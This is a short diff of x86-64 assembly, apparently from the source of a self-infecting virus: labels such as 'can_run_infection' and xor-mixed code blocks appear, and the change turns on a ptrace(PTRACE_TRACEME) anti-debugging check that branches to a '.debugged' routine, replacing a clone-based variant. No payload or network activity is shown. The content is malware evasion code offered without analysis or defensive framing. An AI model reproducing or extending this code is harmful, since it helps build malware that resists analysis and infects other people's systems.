@@ -83,22 +83,13 @@ can_run_infection:
 ; result of xor between the two following blocks
 .begin_mixed_code:
 .begin_anti_debugging:
-;	mov rax, SYS_PTRACE				; _ret = ptrace(
-;	mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
-;	xor rsi, rsi					; 	0,
-;	xor rdx, rdx					; 	0
-;	syscall						; );
-;	cmp rax, 0					; if (_ret < 0)
-;	jl .debugged					; 	goto .debugged;
-
-	mov rax, SYS_CLONE				; _ret = clone(
-	mov rdi, CLONE_PTRACE				; 	CLONE_PTRACE,
-	mov rsi, rsp					;	rsp + 1000,
-	sub rsi, 1000					;	...
-	xor rdx, rdx					;	0,
-	xor r10, r10					;	0,
-	xor r9, r9					; 	0,
+	mov rax, SYS_PTRACE				; _ret = ptrace(
+	mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
+	xor rsi, rsi					; 	0,
+	xor rdx, rdx					; 	0
 	syscall						; );
+	cmp rax, 0					; if (_ret < 0)
+	jl .debugged					; 	goto .debugged;
 
 	call check_process				; _ret = check_process();
 	cmp rax, 1					; if (_ret == !)
